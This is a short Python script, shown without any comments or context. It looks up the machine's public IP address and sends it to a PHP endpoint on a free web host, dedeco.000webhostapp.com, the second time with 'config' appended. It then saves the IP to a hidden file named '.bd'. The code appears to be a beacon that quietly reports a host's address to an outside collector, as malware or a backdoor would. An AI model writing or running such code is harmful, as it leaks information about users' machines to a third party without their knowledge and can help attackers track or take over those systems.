import requests
import os

p=requests.get('https://api.ipify.org')
l = requests.get('https://dedeco.000webhostapp.com/mf.php?fi='+p.text)  
m = requests.get('https://dedeco.000webhostapp.com/mf.php?fi='+p.text+'config')
with open('.bd', 'w') as ip:
    ip.write(p.text)
